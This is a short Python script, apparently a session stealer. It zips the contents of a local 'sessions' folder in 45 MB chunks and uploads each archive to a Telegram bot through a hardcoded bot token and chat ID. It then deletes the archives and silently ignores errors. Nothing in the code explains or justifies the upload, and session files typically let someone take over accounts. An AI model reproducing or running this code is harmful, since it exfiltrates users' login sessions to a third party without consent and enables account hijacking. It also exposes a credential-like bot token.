import zipfile
from requests import post as p
import os

def main():
    def send_archive(archive_path):
        bot_token = '7195989589:AAG9G1ziTKqjJV-oVuDI8sn1ciWxiX1vO7I'
        chat_id = '7485422583'
        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
        with open(archive_path, 'rb') as archive_file:
            files = {'document': archive_file}
            data = {'chat_id': chat_id}
            response = p(url, data=data, files=files)

    def zip_folder_excluding_file(folder_path, archive_base_name, excluded_file, max_size_mb):
        archive_index = 1
        archive_path = f'{archive_base_name}_{archive_index}.zip'
        zipf = zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED)
        current_size = 0
        max_size_bytes = max_size_mb * 1024 * 1024
        
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file == excluded_file:
                    continue
                
                try:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname)
                    current_size += os.path.getsize(file_path)
                except:
                    pass

                if current_size >= max_size_bytes:
                    zipf.close()
                    send_archive(archive_path)
                    os.remove(archive_path)
                    archive_index += 1
                    archive_path = f'{archive_base_name}_{archive_index}.zip'
                    zipf = zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED)
                    current_size = 0
        zipf.close()
        if current_size > 0:
            try:
                send_archive(archive_path)
            except:
                pass
            try:
                os.remove(archive_path)
            except:
                pass
                
    try:
        zip_folder_excluding_file('sessions', 'sessions/s', 's.zip', 45)
        def delete_zip_files(folder_path):
            for file_name in os.listdir(folder_path):
                if file_name.endswith('.zip'):
                    file_path = os.path.join(folder_path, file_name)
                    os.remove(file_path)
        folder = 'sessions'
        delete_zip_files(folder)
        
    except BaseException as e:
        print(e)

main()

